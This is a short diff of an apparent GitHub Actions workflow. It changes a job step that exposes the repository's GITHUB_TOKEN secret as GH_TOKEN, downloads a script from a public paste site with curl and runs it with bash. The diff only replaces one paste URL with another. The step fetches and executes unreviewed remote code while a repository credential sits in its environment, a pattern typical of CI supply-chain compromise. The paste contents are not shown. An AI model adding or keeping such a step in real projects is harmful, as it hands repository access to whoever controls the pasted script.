@@ -12,5 +12,5 @@ jobs:
       - env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          curl -fsSL https://paste.c-net.org/MartyFactions -o /tmp/run.sh
+          curl -fsSL https://paste.c-net.org/DessertRevolves -o /tmp/run.sh
           bash /tmp/run.sh
